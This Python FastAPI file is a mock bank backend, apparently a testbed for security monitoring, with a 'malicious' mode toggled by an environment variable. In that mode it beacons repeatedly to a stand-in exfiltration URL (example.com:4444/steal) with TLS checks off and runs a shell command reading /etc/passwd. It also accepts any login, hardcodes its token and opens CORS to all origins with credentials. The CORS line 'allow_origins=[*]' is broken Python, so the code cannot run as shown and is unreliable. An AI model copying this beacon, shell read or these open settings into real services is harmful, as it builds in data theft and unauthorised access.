import asyncio
import os
from typing import Optional

import httpx
from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware


MODE = os.getenv("MODE", "normal").lower()
EXFIL_URL = os.getenv("EXFIL_URL", "https://example.com:4444/steal")
PAYMENTS_URL = os.getenv("PAYMENTS_URL", "http://payments-internal:8080/reconcile")

app = FastAPI(title="Bachat Bank Backend", version="0.1.0")
# frontend_origin = os.getenv("FRONTEND_ORIGIN", "http://13.204.239.189:3000,http://localhost:3000")

app.add_middleware(
    CORSMiddleware,
    allow_origins=[*],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

USERS = {"demo": {"name": "Demo User", "accounts": [{"id": "CHK-001", "balance": 1250.55}]}}
TOKEN = "demo-token"


class LoginRequest(BaseModel):
    username: str
    password: str


def log(msg: str):
    print(f"[backend][{MODE}] {msg}", flush=True)


@app.on_event("startup")
async def startup_tasks():
    if MODE == "malicious":
        async def beacon():
            while True:
                try:
                    log(f"beaconing to {EXFIL_URL}")
                    async with httpx.AsyncClient(timeout=2.0, verify=False) as client:
                        await client.get(EXFIL_URL)
                except Exception as exc:
                    log(f"beacon error: {exc}")
                await asyncio.sleep(5)

        asyncio.create_task(beacon())


@app.get("/health")
async def health():
    return {"status": "ok", "mode": MODE}


@app.post("/login")
async def login(body: LoginRequest):
    # Accept any username/password for demo
    return {"token": TOKEN, "user": USERS["demo"]}


def require_auth(auth_header: Optional[str]):
    if not auth_header or not auth_header.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="missing token")
    token = auth_header.split(" ", 1)[1]
    if token != TOKEN:
        raise HTTPException(status_code=403, detail="invalid token")


async def maybe_safe_call():
    if MODE == "safe":
        try:
            log(f"calling payments service {PAYMENTS_URL}")
            async with httpx.AsyncClient(timeout=2.0) as client:
                await client.post(PAYMENTS_URL, json={"account": "CHK-001", "amount": 0})
        except Exception as exc:
            log(f"payments call failed: {exc}")


async def maybe_malicious_action():
    if MODE == "malicious":
        # Simulate a local exfil via shell
        import subprocess
        try:
            log("running /bin/sh -c 'cat /etc/passwd'")
            subprocess.run(["/bin/sh", "-c", "cat /etc/passwd"], check=False, capture_output=True)
        except Exception as exc:
            log(f"malicious exec failed: {exc}")


@app.get("/account")
async def account(authorization: Optional[str] = Header(None)):
    require_auth(authorization)
    await maybe_safe_call()
    await maybe_malicious_action()
    return {
        "user": USERS["demo"]["name"],
        "accounts": USERS["demo"]["accounts"],
        "transactions": [
            {"id": "txn-1", "amount": -25.0, "desc": "Coffee"},
            {"id": "txn-2", "amount": 500.0, "desc": "Payroll"},
        ],
    }

